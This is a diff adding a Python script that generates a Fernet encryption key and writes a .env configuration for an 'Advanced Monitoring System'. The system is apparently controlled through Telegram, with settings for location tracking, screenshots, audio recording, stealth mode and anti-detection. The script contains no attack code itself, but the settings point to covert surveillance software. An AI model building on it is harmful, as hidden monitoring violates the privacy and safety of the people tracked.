@@ -1,0 +1,57 @@
+#!/usr/bin/env python3
+"""Generate a proper Fernet key for encryption"""
+from cryptography.fernet import Fernet
+import base64
+
+key = Fernet.generate_key()
+print(f"Generated Fernet key: {key.decode()}")
+
+with open('.env', 'w') as f:
+    f.write(f"""# Advanced Monitoring System Configuration
+
+TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here
+TELEGRAM_BOT_USERNAME=your_bot_username
+
+API_URL=http://localhost:5000
+API_TIMEOUT=30
+
+JWT_SECRET=your-secret-key-here-change-this-in-production
+JWT_EXPIRATION=3600
+ENCRYPTION_KEY={key.decode()}
+
+DATABASE_URL=monitoring_system.db
+DATABASE_BACKUP_INTERVAL=3600
+
+ADMIN_USERS=123456789,987654321
+DEFAULT_ADMIN_ID=123456789
+
+ALERT_CHECK_INTERVAL=60
+MAX_ALERT_RETRIES=3
+DEVICE_OFFLINE_THRESHOLD=300
+LOCATION_UPDATE_INTERVAL=60
+
+UPLOAD_FOLDER=/tmp/uploads
+MAX_FILE_SIZE=50
+SCREENSHOT_QUALITY=80
+AUDIO_RECORDING_DURATION=30
+
+LOG_LEVEL=INFO
+LOG_FILE=monitoring_system.log
+
+HOST=0.0.0.0
+PORT=5000
+DEBUG=False
+
+WEBHOOK_URL=
+WEBHOOK_PORT=8443
+
+MAX_WORKERS=4
+WORKER_TIMEOUT=30
+KEEP_ALIVE=2
+
+ENABLE_STEALTH_MODE=True
+ENABLE_ENCRYPTION=True
+ENABLE_ANTI_DETECTION=True
+""")
+
+print("✅ .env file updated with proper Fernet key")
